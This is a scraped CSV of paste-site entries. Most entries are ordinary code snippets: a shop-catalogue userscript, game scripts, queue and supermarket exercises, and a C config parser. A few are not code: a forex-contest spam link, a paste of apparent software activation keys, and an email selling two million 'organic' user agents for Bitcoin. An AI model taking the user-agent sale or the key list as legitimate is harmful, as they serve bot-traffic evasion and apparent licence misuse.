id,title,username,language,date,content
ZTPUp7hq,Untitled,DaniDori,JavaScript,Monday 15th of April 2024 11:54:21 AM CDT,"(function () {
  ""use strict"";

  let phonePrice = 23000;

  const igraBtn = document.createElement(""button"");
  const igraPercentageBtn = document.createElement(""button"");
  const igraDisplayBtn = document.createElement(""button"");
  const igraInput = document.createElement(""input"");
  const promoInput = document.createElement(""input"");
  
  
  
  igraDisplayBtn.classList.add(""igra-btn-display"");
  igraDisplayBtn.textContent = ""X"";
  
  //обработка кнопки крестик
  igraDisplayBtn.addEventListener(""click"", () => {
    igraBtn.classList.toggle('d-n');
    igraPercentageBtn.classList.toggle('d-n');
    igraInput.classList.toggle('d-n');
    promoInput.classList.toggle('d-n');
  });
 //обработка кнопки Посчитать
  igraBtn.textContent = ""Посчитать"";
  igraBtn.classList.add(""igra-btn"");
  igraBtn.addEventListener(""click"", () => {
    phonePrice = Number(igraInput.value);
    igraSortCatalog();
  });
   //обработка кнопки сортировать
  igraPercentageBtn.textContent = ""Сортировать"";
  igraPercentageBtn.classList.add(""igra-btn-percent"");
  igraPercentageBtn.addEventListener(""click"", () => {
    phonePrice = Number(igraInput.value);
    igraSortPercentage();
  });

  
 //обработка поля ввода цены
  igraInput.type = ""number"";
  igraInput.classList.add(""igra-input"");
  igraInput.value = phonePrice;
  igraInput.addEventListener(""input"", () => {
    igraInput.value = igraInput.value.replace(/[^0-9]/g, """");
    phonePrice = Number(igraInput.value);
  });
  
  
  let igraPromoString = ''
  let promoArr = [];
   //обработка поля ввода промокода
  //promoInput.type = ""string"";
  promoInput.classList.add(""promo-input"");
  promoInput.value = `cats  20000  70000  7000
  dogs  7000  60000  6000
  cows  3000  15000  5500
  eagles  21000  105000  7500`;
  promoInput.addEventListener(""input"", () => {
   // очищаем массив перед каждым новым заполнением
   igraPromoString=promoInput.value.split(/\s+/)
		for (let i=0; i<igraPromoString.length; i+=4) {
		  let promoName = igraPromoString[i];
		  let discont = +igraPromoString[i+1];
		  let minSum = +igraPromoString[i+2]
		  let promoPrice = +igraPromoString[i+3]
		  promoArr.push([promoName, discont, minSum, promoPrice])
		}
});

  

  setTimeout(() => {
    const igraBody = document.body;
    igraBody.appendChild(igraDisplayBtn);
    igraBody.appendChild(igraPercentageBtn);
    igraBody.appendChild(igraBtn);
    igraBody.appendChild(igraInput);
    igraBody.appendChild(promoInput);
  }, 1000);

  let igraCards = [];

  function getIgraCards() {
    return (igraCards = Array.from(document.querySelectorAll("".catalog-item"")));
  }

  function mapIgraCards() {
    igraCards = getIgraCards();
    igraCards.forEach((card) => {
      if (card.querySelector("".item-price"")) {
        const igraItemPrice = igraConvertToNumber(
          card.querySelector("".item-price"").textContent
        );
        const igraItemBonus = igraConvertToNumber(
          card.querySelector("".bonus-amount"").textContent
        );
        const igraItemMoney = card.querySelector("".item-money"");

        const igraItemProfit = document.createElement(""div"");
        igraItemProfit.classList.add(""item-profit"");
        igraItemProfit.textContent = igraGetProfitPrice(
          igraItemPrice,
          igraItemBonus
        ) + '\n' + promoWorkHard(igraItemPrice, igraItemBonus, promoArr, phonePrice);
        
        if (igraItemMoney.querySelector("".item-profit"")) {
          igraItemMoney.querySelector("".item-profit"").remove();
        }
        igraItemMoney.append(igraItemProfit);
      }
    });
  }

  function igraConvertToNumber(str) {
    // Удаляем все пробелы из строки
    let stringWithoutSpaces = str.replace(/ /g, """");

    // Удаляем знак рубля, если есть
    let stringWithoutCurrencySign = stringWithoutSpaces.replace(""₽"", """");

    // Преобразуем строку в число
    let number = parseFloat(stringWithoutCurrencySign);

    // Возвращаем число
    return number;
  }

  function igraGetProfitPrice(price, bonus) {
    let a = price - bonus;
    let b = phonePrice - a;
    let c = (phonePrice - price + 0.8 * bonus) * 100 / price
    return c.toFixed(2);
  }

  function igraSortCatalog() {
    mapIgraCards();
    let igraSortedCards = sortDivByPrice(getIgraCards());

    const igraCatalogItems = document.querySelector("".catalog-listing__items"");
    igraCatalogItems.innerHTML = """";
    igraSortedCards.map((card) => {
      igraCatalogItems.append(card);
    });
  }
  
  function igraSortPercentage() {
    mapIgraCards();
    let igraSortedCards = sortDivByPricePercentage(getIgraCards());
    console.log(igraSortedCards)

    const igraCatalogItems = document.querySelector("".catalog-items-list"");
    igraCatalogItems.innerHTML = """";
    igraSortedCards.map((card) => {
      igraCatalogItems.append(card);
    });
  }
	
	//функция подсчета промокода
	function promoWorkHard(phonePrice, bonusNum, promoArr, igraPrice){
		let bestRoi = 0, bestPromoName = """";
		let RoiMin = 0, RoiMax = 0
		let bestPhoneCount = 0, totalPriceMin = 0, totalPriceMax = 0, bonusPercent = 0;
		let totalBonus = 0;
		for (let i = 0; i < promoArr.length; i++){
			let promoName = promoArr[i][0], discont = promoArr[i][1];
			let minSum = promoArr[i][2], promoPrice= promoArr[i][3];
			
		  let kMax = Math.ceil(minSum / phonePrice);
		  let kMin = Math.floor(minSum / phonePrice);
		  
		  let totalPriceMax = phonePrice * kMax;
		  let totalPriceMin = phonePrice * kMin;
		  bonusPercent = bonusNum / phonePrice; 
		  let totalBonusMax = (totalPriceMax - discont) * bonusPercent * 0.8
		  let totalBonusMin = (totalPriceMin - discont) * bonusPercent * 0.8
		  
		  RoiMax = (igraPrice * kMax - totalPriceMax + totalBonusMax + promoPrice) / (totalPriceMax + promoPrice)
		  RoiMin = (igraPrice * kMin - totalPriceMin + totalBonusMin + promoPrice) / (totalPriceMin + promoPrice)
		  
		  if(RoiMin > bestRoi){
		    bestRoi = RoiMin
		    bestPhoneCount = kMin
		    bestPromoName = promoName
		  }
		  if(RoiMax > bestRoi){
		    bestRoi = RoiMax
		    bestPhoneCount = kMax
		    bestPromoName = promoName
		  }
		}
		 return `${bestPromoName}, ${bestPhoneCount}, ${bestRoi.toFixed(2)}`;
	}
	
  function sortPrices(arr) {
    const prices = arr.map((div) => {
      const itemProfit = div.querySelector("".item-profit"");
      const price = itemProfit.textContent;
      return parseInt(price);
    });
    prices.sort((a, b) => b - a);
    return prices;
  }
  function sortDivByPrice(arr) {
    const sortedArr = arr.sort((a, b) => {
      if (a.querySelector("".item-profit"")) {
        const priceA = Number(a.querySelector("".item-profit"").textContent);
        const priceB = Number(b.querySelector("".item-profit"").textContent);
return priceB - priceA;
      }
    });
    return sortedArr;
  }
  
    function sortDivByPricePercentage(arr) {
    const sortedArr = arr.sort((a, b) => {
      if (a.querySelector("".bonus-percent"")) {
        const priceA = Number(igraMyGeeks(a.querySelector("".bonus-percent"").textContent));
        const priceB = Number(igraMyGeeks(b.querySelector("".bonus-percent"").textContent));

        return priceB - priceA;
      }
    });

    return sortedArr;
  }
  
  function igraMyGeeks(string) {
 
    // Input string
    let str = string;
 
    // Using match with regEx
    let matches = str.match(/(\d+)/);
     
    // Display output if number extracted
    if (matches) {
        return matches[0];
    }
}
})();"
JU3Hxrma,1.6b,Shiko5303,Lua,Monday 15th of April 2024 11:41:52 AM CDT,"gg.alert[[
⠀⠀⠀⣀⣾⡿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣠⣶⣾⢿⣿⣳⣦⡀⠀⠀⠀⠀⣶⡶⣶⣶⠀⠀⠀⠀⠀⠀⠀
⣠⣤⣾⢿⣽⣻⣽⠇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣟⣷⡻⠏⠱⠿⠳⠟⠆⠀⠀⠀⣿⣽⢷⣻⠀⣀⣀⡀⠀⠀⠀
⣿⣟⣾⡟⣷⣻⡽⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣟⣾⣽⣧⣶⡶⣶⢦⡀⠀⠀⠀⠀⣿⢾⣻⣟⡿⣯⡿⣽⡷⣆⠀
⠉⠀⠀⠀⣿⢯⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⢸⣟⡾⣷⡟⠇⠛⣯⣿⣻⠆⠀⠀⠀⣿⣻⣽⣾⠛⠉⢹⣷⣟⡿⡄
⠀⠀⠀⠀⣿⡿⣷⠇⠀⠀⠀⣀⣀⣀⡀⠀⢸⣏⣿⣷⡇⠀⠀⣿⢷⣿⡇⠀⠀⠀⣿⣹⢷⣿⠀⠀⢸⡿⣾⡿⠇
⠀⠀⠀⠀⣿⣽⣟⡇⠀⠀⠀⣿⢯⣟⡧⠀⠀⢻⣾⣳⣧⢦⣶⣟⣯⡷⠃⠀⠀⠀⣿⡽⣿⣽⣳⣦⡾⣿⣽⡻⠃
⠀⠀⠀⠀⠛⠓⠛⠂⠀⠀⠀⠛⠛⠙⠃⠀⠀⠀⠈⠛⠞⠛⠓⠏⠋⠁⠀⠀⠀⠀⠻⠽⠻⠮⠙⠷⠿⠳⠟⠁⠀
]]"
EEuuinx1,Win Exciting Prizes : Participate in the Vittaverse Forex Trading Contest,reviewbrokers,PHP,Monday 15th of April 2024 11:41:50 AM CDT,https://www.reviewbrokers.net/win-exciting-prizes-participate-in-the-vittaverse-forex-trading-contest/
sbQdvg72,Untitled,Nil000,Email,Monday 15th of April 2024 11:39:39 AM CDT,"email: geralddemail@gmail.com
---------
Hello!

I am contacting you about an interesting sale proposal!

I have in my possession, two million, real, organic, user agents. They are very rare and support a variety of apps and websites.

If you ever need more, I will try my best to provide you with similar user agents.

The price for the whole 2 million user agents pack is $2,000, though it can be negotiated.

The only payment method I accept is Bitcoin.

Sincerely, Gerald."
QXAS2Afp,crafter-dustseeds.lua,Inlife,Lua,Monday 15th of April 2024 11:28:44 AM CDT,"local CRAFT_BATCH_SIZE = 16;
local CRAFT_SLEEP_WAIT = 2;

local craftTable = {
    {""f"", ""t"", 0, 0},
    {0, 0, 0, 0},
    {0, 0, 0, 0},
    {0, 0, 0, 0}
}

function cleanUpInventory()
    print(""[cr] cleaning up the inventory"")
    for i=1,16 do
        turtle.select(i)
        turtle.dropDown()
    end
end

function loadIngridient(slot, direction)
    if direction == 0 then
        return
    end

    print(""[cr] loading item to slot "" .. slot)
    turtle.select(slot)

    local res
    local count = turtle.getItemCount()

    if direction == ""t"" then
        res = turtle.suckUp(CRAFT_BATCH_SIZE - count)
    elseif direction == ""b"" then
        res = turtle.suckDown(CRAFT_BATCH_SIZE - count)
    elseif direction == ""f"" then
        res = turtle.suck(CRAFT_BATCH_SIZE - count)
    end

    if not res then
        print(""[cr] could not get items to the slot, waiting and trying again..."")
        sleep(CRAFT_SLEEP_WAIT)
        return loadIngridient(slot, direction)
    end

    if turtle.getItemCount() < CRAFT_BATCH_SIZE then
        print(""[cr] loaded less items then expected, waiting to try fill up fully..."")
        sleep(CRAFT_SLEEP_WAIT)
        return loadIngridient(slot, direction)
    end
end

function iterate()
    print(""[cr] getting ingredients"")
    for i,row in ipairs(craftTable) do
        for j,col in ipairs(row) do
            print(""[cr] loading into slot "" .. j .. ';' .. i);
            loadIngridient(i*4+j, col)
        end
    end

    print(""[cr] crafting"")
    turtle.select(1)
    turtle.craft()

    print(""[cr] pooping out results ..."")
    while turtle.getItemCount() > 0 do
        sleep(CRAFT_SLEEP_WAIT)
    end
end

function main()
    print(""\n\n-------------------------------"")
    print(""[cr] starting the program; v1.0"")
    print(""-------------------------------\n\n"");
    cleanUpInventory()

    while true do
        iterate()
    end
end

main()"
MaGqpJNt,ZP Checker 2024,softupdate,PHP,Monday 15th of April 2024 11:04:10 AM CDT,"--------------ZP Checker------------
BB06-DBEB-2021-BB06-BB0D66BB0653 me
D72C-452D-2021-D72C-483B13D72CF9 15-04-2024 *** 2months"
MfyrC3Bt,returns a wrong normal,AlewAlow,Lua,Monday 15th of April 2024 10:53:03 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local UserInputService = game:GetService(""UserInputService"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)
local Constants = require(ReplicatedStorage.Shared.Constants)

local GetEntityGlobalScale = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalScale)
local GetEntityGlobalPosition = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalPosition)
local GetEntityDescendants = require(ReplicatedStorage.Shared.Utils.GetEntityDescendants)

local function FireShapecast(origin, direction, size, entities, world)
	if type(entities) == ""number"" then
		entities = GetEntityDescendants(entities, world)
	end
	
	local closestHit = nil
	local closestTime = math.huge
	local closestNormal = Vector2.new()
	local closestPosition = Vector2.new()

	local invDirection = 1 / direction

	for _, id in pairs(entities) do
		local transform = world:get(id, Components.Transform)
		if not transform then
			continue
		end

		local collider = world:get(id, Components.Collider)
		if not collider then
			continue
		end

		local globalPosition = GetEntityGlobalPosition(id, world)
		local globalSize = GetEntityGlobalScale(id, world) * collider.Size

		local topleft = globalPosition - globalSize / 2
		local botright = globalPosition + globalSize / 2

		local tEnter = (topleft - origin) * invDirection
		local tExit = (botright - origin) * invDirection

		local tMin = Vector2.new(math.max(math.min(tEnter.X, tExit.X), 0), math.max(math.min(tEnter.Y, tExit.Y), 0))
		local tMax = Vector2.new(math.min(math.max(tEnter.X, tExit.X), 1), math.min(math.max(tEnter.Y, tExit.Y), 1))

		if tMax.X < tMin.Y or tMax.Y < tMin.X then
			continue
		end

		local collisionTime = math.max(tMin.X, tMin.Y)
		if collisionTime >= closestTime then
			continue
		end

		local collisionPoint = origin + collisionTime * direction
		local collisionNormal

		if tMax.X > tMin.Y then
			if tEnter.X < tExit.X then
				collisionNormal = Vector2.new(-1, 0)
			else
				collisionNormal = Vector2.new(1, 0)
			end
		else
			if tEnter.Y < tExit.Y then
				collisionNormal = Vector2.new(0, -1)
			else
				collisionNormal = Vector2.new(0, 1)
			end
		end

		closestNormal = collisionNormal
		closestPosition = collisionPoint
		closestTime = collisionTime
		closestHit = id
	end

	if closestTime < math.huge then
		return {
			Hit = closestHit,
			Position = closestPosition,
			Normal = closestNormal,
		}
	end

	return false
end



return FireShapecast"
GHPRCGWx,p_server,IndoSofts,PHP,Monday 15th of April 2024 10:37:13 AM CDT,https://mx.ebizzleads.com/profilechecker/2024/response.js
B9RkydCm,Queue,rado_dimitrov66,C++,Monday 15th of April 2024 10:24:05 AM CDT,"#include <iostream>

using namespace std;

struct Queue
{
	int value;
	Queue* next;
} *first = NULL, * last = NULL;



void addValues(unsigned int& counter)
{

	Queue* p = last;

	int n;

	cout << ""Enter a value: "";
	cin >> n;

	last = new Queue;

	last->value = n;
	last->next = NULL;

	if (first == NULL)
	{
		first = last;
	}
	else
	{
		p->next = last;
	}

	counter++;

}

void removeValues()
{
	
	while (first)
	{
		Queue* p = first;

		first = p->next;
		delete p;
	}

	cout << ""The queue is already empty"" << endl;
	cout << endl;	

}

void printValues()
{
	Queue* p = first;

	while (p != NULL)
	{
		cout << p->value << "" "";
		p = p->next;
	}
	cout << endl;
}

void removeNAndChange(unsigned int& counter)
{
	int n;
	int x;

	Queue* p = first;

	do
	{
		cout << ""Enter a number of element to remove"" << ""["" << counter << ""-2]: "";
		cin >> n;

	} while (n < 2 || n > counter);

	cout << ""Enter a new value: "";
	cin >> x;

	if (n == 2)
	{
		p = p->next;

		first->value = x;

		first->next = p->next;

		delete p;

		counter--;

	}
	else {

		for (int i = 2; i <= n - 1; i++)
		{
			p = p->next;

		}

		p->value = x;

		if (n < counter)
		{
			p->next = p->next->next;

			p = p->next;

			delete p;
		}
		else
		{
			p->next = NULL;
		}

		counter--;
	}

}

int main()
{
	short choose = -1;

	unsigned int counter = 0;

	do
	{

		cout << ""[1] Add a value to the queue\n[2] Remove element/s\n[3] Print all elements\n[4] Remove N element by last to start and Change value on N-1\n"";
		cin >> choose;

		switch (choose)
		{

		case 1:

			system(""cls"");

			addValues(counter);


			choose = -1;


			break;

		case 2:

			system(""cls"");

			if (first)
			{
				removeValues();
			}
			else
			{
				cout << ""The queue is empty"" << endl;
			}

			choose = -1;

			break;


		case 3:

			system(""cls"");

			if (first)
			{
				printValues();
			}
			else
			{
				cout << ""The queue is empty"" << endl;
			}

			choose = -1;

			break;
		case 4:

			system(""cls"");

			if (first)
			{
				removeNAndChange(counter);
			}
			else {
				cout << ""The queue is empty"" << endl;
			}

			choose = -1;

			break;
		default:
			break;
		}

	} while (choose < 0 || choose > 4);
}

"
LneR80ZG,Untitled,_KAGATUN_,C#,Monday 15th of April 2024 10:23:55 AM CDT,"//Написать программу администрирования супермаркетом.
//В супермаркете есть очередь клиентов.
//У каждого клиента в корзине есть товары, также у клиентов есть деньги.
//Клиент, когда подходит на кассу, получает итоговую сумму покупки и старается её оплатить.
//Если оплатить клиент не может, то он рандомный товар из корзины выкидывает до тех пор, пока его денег не хватит для оплаты.
//Клиентов можно делать ограниченное число на старте программы.
//Супермаркет содержит список товаров, из которых клиент выбирает товары для покупки.

using System;
using System.Collections.Generic;

namespace Supermarket
{
    class Program
    {
        static void Main(string[] args)
        {
            Shop shop = new Shop();
            shop.ShopWork();
        }
    }

    public class Utilities
    {
        private static Random _random = new Random();

        public static int GetRandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        public static int GetRandomNumber(int max)
        {
            return _random.Next(max);
        }
    }

    class Product
    {
        public Product(string title, int price)
        {
            Title = title;
            Price = price;
        }

        public string Title { get; private set; }

        public int Price { get; private set; }

        public void ShowProduct()
        {
            Console.WriteLine($""\n\tНаименование товара: {Title} \tЦена товара: {Price}"");
        }
    }

    class Buyer
    {
        private List<Product> _basket;

        private int _minRandomMoney = 500;
        private int _maxRandomMoney = 3000;

        private string _name;

        public Buyer(string name)
        {
            _name = name;

            _basket = new List<Product>();

            Money = Utilities.GetRandomNumber(_minRandomMoney, _maxRandomMoney);
        }

        public int Money { get; private set; }

        public void ShowInfo(string text)
        {
            Console.WriteLine($""\n{_name}. Капитал: {Money}"");

            if (_basket.Count == 0)
            {
                Console.WriteLine($""\nКорзина пуста"");
            }
            else
            {
                Console.WriteLine(text);

                for (int i = 0; i < _basket.Count; i++)
                {
                    _basket[i].ShowProduct();
                }

                Console.WriteLine(""----------------"");
            }
        }

        public void TryBuyProducts()
        {
            Console.WriteLine($""Общая стоимость продуктов в корзине {GetTotalPrice()}"");

            RemoveRandomProduct();
            PayProduct();
            ShowInfo(""Купленный товар:"");
        }

        public void FillBasket(List<Product> products)
        {
            int randomProductCount = Utilities.GetRandomNumber(products.Count);

            for (int i = 0; i < randomProductCount; i++)
            {
                int index = Utilities.GetRandomNumber(products.Count);
                _basket.Add(products[index]);
            }
        }

        private void PayProduct()
        {
            Money -= GetTotalPrice();
        }

        private int GetTotalPrice()
        {
            int totalPrice = 0;

            for (int i = 0; i < _basket.Count; i++)
            {
                totalPrice += _basket[i].Price;
            }

            return totalPrice;
        }

        private void RemoveRandomProduct()
        {
            while (GetTotalPrice() > Money && _basket.Count > 0)
            {
                _basket.Remove(_basket[Utilities.GetRandomNumber(_basket.Count)]);
            }
        }
    }

    class Shop
    {
        private int _money = 0;

        private List<Product> _assortment;

        private Queue<Buyer> _buyers;

        public Shop()
        {
            _buyers = new Queue<Buyer>();

            _assortment = new List<Product>
            {
                new Product(""Блендер"", 1100),
                new Product(""Картофель мытый в сетке 5кг"", 280),
                new Product(""Зубная паста Большой тюбик"", 250),
                new Product(""Яблоко сорт Голд 1 шт"", 35),
                new Product(""Лук в сетке Эконом 3кг"", 165),
                new Product(""Хлеб"", 55),
                new Product(""Молоко 1 литр"", 65),
                new Product(""Коффе Якобс 185гр"", 275),
                new Product(""Свинина 1кг"", 260),
                new Product(""Курица Бройлер2кг охлажденная"", 380),
                new Product(""Мука 1 сорт 1кг"", 85),
                new Product(""Апельсин 1кг"", 130),
                new Product(""Торт Наполеон 500гр"", 475),
                new Product(""Банан 1кг"", 80),
                new Product(""Сметана стакан 250гр"", 75),
                new Product(""Макароны Макфа 200гр"", 150),
                new Product(""Сельдь филе кусочками 500гр"", 380)
            };
        }

        public void ShopWork()
        {
            Shop shop = new Shop();
            shop.ShowAssortment();
            shop.CreateQueue();
            shop.ShowBuyers();
            shop.FillBuyersBasket();
            shop.ShowBuyers();
            shop.ServeBuyers();
        }

        private void MakeProfit(List<Product> product)
        {
            for (int i = 0; i < product.Count; i++)
            {
                _money += product[i].Price;
            }
        }

        private void CreateQueue()
        {
            Console.WriteLine(""Покупатели:"");

            _buyers.Enqueue(new Buyer(""Наталья""));
            _buyers.Enqueue(new Buyer(""Александр""));
            _buyers.Enqueue(new Buyer(""Евгений""));
        }

        private void ShowBuyers()
        {
            foreach (Buyer buyer in _buyers)
            {
                buyer.ShowInfo(""Товар в корзине"");
            }
        }

        private void ShowAssortment()
        {
            Console.WriteLine(""Ассортимент супермаркета:"");

            for (int i = 0; i < _assortment.Count; i++)
            {
                _assortment[i].ShowProduct();
            }
        }

        private void FillBuyersBasket()
        {
            foreach (Buyer buyer in _buyers)
            {
                buyer.FillBasket(new List<Product>(_assortment));
            }
        }

        private void ServeBuyers()
        {
            while (_buyers.Count > 0)
            {
                Buyer buyer = _buyers.Dequeue();
                buyer.TryBuyProducts();
            }
        }
    }
}
"
0g2YZCYb,Next Functional Component,fakesamgregory,JSON,Monday 15th of April 2024 10:22:27 AM CDT,"{
	// Place your global snippets here. Each snippet is defined under a snippet name and has a scope, prefix, body and 
	// description. Add comma separated ids of the languages where the snippet is applicable in the scope field. If scope 
	// is left empty or omitted, the snippet gets applied to all languages. The prefix is what is 
	// used to trigger the snippet and the body will be expanded and inserted. Possible variables are: 
	// $1, $2 for tab stops, $0 for the final cursor position, and ${1:label}, ${2:another} for placeholders. 
	// Placeholders with the same ids are connected.
	""Next Functional Component"": {
		""scope"": ""javascript,typescript,jsx,tsx"",
		""prefix"": ""nfc"",
		""body"": [
			""const $1 = () => {"",
			""  return ("",
			""    <div>"",
			""      $2"",
			""    </div>"",
			""  );"",
			""};"",
			"""",
			""export default $1;""
		],
		""description"": ""Create a new functional component""
	},

	""Next Route Component"": {
		""scope"": ""javascript,typescript,jsx,tsx"",
		""prefix"": ""nrpc"",
		""body"": [
			""export async function $1(request) {"",
			""  // const { $2 } = await request.json();"",
			"""",
			""	 if (!$2) {"",
			""	 	 return Response.json({"",
			""      success: false,""
			"" 	   message: \""Missing required fields\"","",
			""	     status: 400,"",
			""	 	 });"",
			""	 }"",
			"""",
			""  return Response.json({""
			""	   success: true,""
			""	   message: \""Route created successfully\"","",
			""    data: { someData: true },""
			""	   status: 200,""
			""  });""
			""}""
		],
		""description"": ""Create a new route component""
	}
}"
RsbARLBC,kv_parser,mdgaziur001,C,Monday 15th of April 2024 10:15:37 AM CDT,"#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct Config {
  bool  show_welcome;
  bool  kill_yourself;
  char* last_message;
};

char *get_key(const char **buf) {
  char *key = (char*)malloc(sizeof(char) * 12 + 1);
  if (key == NULL) {
    printf(""Failed to allocate buffer for key\n"");
    return NULL;
  }

  unsigned int key_size = 0;
  unsigned int key_cap = 12;

  while (**buf != '\0' && **buf != '\n' && **buf != '=') {
    if (**buf == ' ' || **buf == '\t') {
      *buf = *buf + 1;
      continue;
    }

    if (key_size >= key_cap) {
      key_cap *= 2;
      key = realloc(key, sizeof(char) * key_cap + 1);
      if (key == NULL) {
        printf(""Failed to reallocate buffer for key\n"");
        return NULL;
      }
    }

    key[key_size] = **buf;
    key_size++;
    *buf = *buf + 1;
  }
  key[key_size] = '\0';
  return key;
}

char *get_val(const char **buf) {
  char *key = (char*)malloc(sizeof(char) * 12 + 1);
  if (key == NULL) {
    printf(""Failed to allocate buffer for key\n"");
    return NULL;
  }

  // eat whitespaces till we reach a valid character
  while (**buf != '\0' && (**buf == ' '  || **buf == '\t')) {
    *buf = *buf + 1;
  }

  bool is_string = **buf == '""' ? true : false;
  if (is_string) *buf = *buf + 1;

  unsigned int key_size = 0;
  unsigned int key_cap = 12;

  while (**buf != '\0') {
    if (is_string && **buf == '""') {
      *buf = *buf + 1;
      break;
    } else if (**buf == '\n' || **buf == '=') {
      break;
    } else if (!is_string && (**buf == ' ' || **buf == '\t')) {
      *buf = *buf + 1;
      continue;
    }

    if (key_size >= key_cap) {
      key_cap *= 2;
      key = realloc(key, sizeof(char) * key_cap + 1);
      if (key == NULL) {
        printf(""Failed to reallocate buffer for key\n"");
        return NULL;
      }
    }

    key[key_size] = **buf;
    key_size++;
    *buf = *buf + 1;
  }
  key[key_size] = '\0';
  return key;
}

int parse_input(const char *buf, struct Config* cfg) {
  while (*buf != '\0') {
    char *key = get_key(&buf);
    if (key == NULL) return 1;
    buf++;

    char *val = get_val(&buf);
    if (val == NULL) return 1;
    buf++;
 
    if (strcmp(key, ""show_welcome"") == 0) {
      if (strcmp(val, ""true"") == 0) {
        cfg->show_welcome = true;
      } else if (strcmp(val, ""false"") != 0) {
        printf(""WARNING: wrong type of value for `show_welcome`, defaulting to `false`\n"");
      }

      free(key);
      free(val);
    } else if (strcmp(key, ""kill_yourself"") == 0) {
      if (strcmp(val, ""true"") == 0) {
        cfg->kill_yourself = true;
      } else if (strcmp(val, ""false"") != 0) {
        printf(""WARNING: wrong type of value for `kill_yourself`, defaulting to `false`\n"");
      }

      free(key);
      free(val);
    } else if (strcmp(key, ""last_message"") == 0) {
      free(cfg->last_message);
      cfg->last_message = val;
      
      free(key);
    } else {
      printf(""WARNING: unknown key '%s'\n"", key);
      free(key);
      free(val);
    }
  }
  return 0;
}

int main(int argc, const char** argv) {
  if (argc < 2) {
    printf(""Usage: %s [FILE]\n"", argv[0]);
    return 0;
  };

  FILE *fp = fopen(argv[1], ""r"");
  if (fp == NULL) {
    printf(""Failed to open file: %s\n"", argv[1]);
    return 1;
  }
  
  fseek(fp, 0L, SEEK_END);
  unsigned int sz = ftell(fp);
  rewind(fp);

  char *buf = (char*)malloc(sizeof(char) * sz + 1);
  if (!buf) {
    printf(""Failed to create buffer\n"");
    return 1;
  }

  fread(buf, sz, sizeof(char), fp);
  buf[sz] = '\0';

  fflush(fp);
  fclose(fp);

  struct Config *cfg = (struct Config*)malloc(sizeof(struct Config));
  cfg->show_welcome = false;
  cfg->kill_yourself = false;
  cfg->last_message = (char*)malloc(sizeof(char));
  cfg->last_message[0] = '\0';

  int ret = parse_input(buf, cfg);

  printf(""Config {\n""
         ""\tshow_welcome: %s,\n""
         ""\tkill_yourself: %s,\n""
         ""\tlast_message: \""%s\""\n""
         ""}\n"",
         cfg->show_welcome ? ""true"" : ""false"",
         cfg->kill_yourself ? ""true"" : ""false"",
         cfg->last_message
  );

  free(buf);
  free(cfg->last_message);
  free(cfg);

  return ret;
}
"
